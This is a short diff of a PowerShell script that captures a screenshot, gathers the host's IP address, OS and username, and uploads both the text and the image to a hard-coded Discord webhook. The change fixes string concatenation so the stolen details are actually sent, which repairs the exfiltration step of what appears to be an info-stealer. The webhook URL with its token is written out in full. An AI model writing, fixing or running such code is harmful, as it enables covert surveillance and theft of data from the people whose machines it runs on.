@@ -11,7 +11,7 @@ $graphics = [System.Drawing.Graphics]::FromImage($screenshot);
 $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); 
 $screenshot.Save('C:\screenshot.png'); 
 $graphics.Dispose(); $screenshot.Dispose(); 
-$message = @{content = 'System Information: `nIP Address: $ipAddress `nOS: $os `nUsername: $username'}; 
+$message = @{content = 'System Information: `nIP Address: ' + $ipAddress + ' `nOS: ' + $os + ' `nUsername: ' + $username}; 
 $webhookUrl = 'https://discord.com/api/webhooks/1391532249156947998/6COjLrMLUvb8Oe3uqBg0DVlPhPVWdpj7_QXNwNN9NhWLrrlFvSpAwZWrxjsvu5UOvbtm'; 
 Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body ($message | ConvertTo-Json); 
 Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/octet-stream' -Body ([System.IO.File]::ReadAllBytes('C:\screenshot.png')); 
